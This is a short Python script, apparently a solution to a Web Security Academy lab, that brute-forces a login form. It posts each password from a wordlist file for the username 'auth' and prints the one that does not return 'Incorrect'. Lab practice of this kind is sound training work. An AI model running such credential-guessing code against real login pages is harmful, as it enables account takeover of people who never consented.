import requests

url = 'https://0a37003404fe311b81b4e9e00043008a.web-security-academy.net/login'


lines = [line.strip() for line in open("../pass.txt", "r")]
for line in lines:
    payload = {"username" : "auth", "password" : line}
    owo = requests.post(url, data=payload)
    if "Incorrect" in owo.text:
        continue
    else:
        print(line)
